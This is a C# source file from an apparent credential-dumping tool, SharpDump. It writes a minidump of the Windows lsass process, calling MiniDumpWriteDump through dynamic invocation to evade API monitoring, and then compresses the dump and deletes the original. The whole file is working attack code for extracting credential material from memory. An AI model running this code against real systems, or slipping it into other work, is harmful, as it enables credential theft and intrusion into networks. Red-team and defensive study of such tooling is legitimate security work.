using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using SharpHandler;


namespace SharpDump
{
    class Dumper
    {
        public static void Compress(string inFile, string outFile)
        {
            try
            {
                if (File.Exists(outFile))
                {
                    Console.WriteLine("[X] Output file '{0}' already exists, removing", outFile);
                    File.Delete(outFile);
                }

                var bytes = File.ReadAllBytes(inFile);
                using (FileStream fs = new FileStream(outFile, FileMode.CreateNew))
                {
                    using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
                    {
                        zipStream.Write(bytes, 0, bytes.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception while compressing file: {0}", ex.Message);
            }
        }

        public static void Minidump(IntPtr hLsass, string dumpFile, bool compress)
        {

            uint targetProcessId = (uint)Process.GetProcessesByName("lsass")[0].Id;
            IntPtr targetProcessHandle = hLsass;
            bool bRet = false;

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                IntPtr minidumpPtr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("Dbgcore.dll", "MiniDumpWriteDump", true);
                Object[] minidumpArgs = { targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero };
                bRet = (bool)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(minidumpPtr, typeof(Delegates.MiniDumpWriteDump), ref minidumpArgs);

            }

            // if successful
            if (bRet)
            {
                Console.WriteLine("[+] Dump successful!");
                if (compress)
                {
                    string zipFile = dumpFile + ".gz";
                    Console.WriteLine(String.Format("\n[*] Compressing {0} to {1} gzip file", dumpFile, zipFile));
                    Compress(dumpFile, zipFile);
                    Console.WriteLine(String.Format("[*] Deleting {0}", dumpFile));
                    File.Delete(dumpFile);
                }
                Console.WriteLine("\n[+] Dumping completed.");

            }
            else
            {
                Console.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
            }
        }

    }
}
